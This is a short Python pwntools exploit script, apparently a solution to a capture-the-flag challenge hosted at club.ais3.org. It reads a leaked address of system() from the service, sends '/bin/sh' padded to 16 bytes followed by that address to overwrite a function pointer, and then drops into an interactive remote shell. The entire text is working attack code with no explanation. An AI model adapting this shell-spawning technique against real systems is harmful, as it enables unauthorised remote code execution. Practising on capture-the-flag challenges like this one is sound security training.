from pwn import *

#op = process('./chal')
p = remote("club.ais3.org", 5001)
p.recvuntil("system(): 0x")
system = int(p.recvline(), 16)
print("system: {}".format(hex(system)))
p.sendline('/bin/sh'.ljust(0x10, '\x00') + p64(system))
p.interactive()
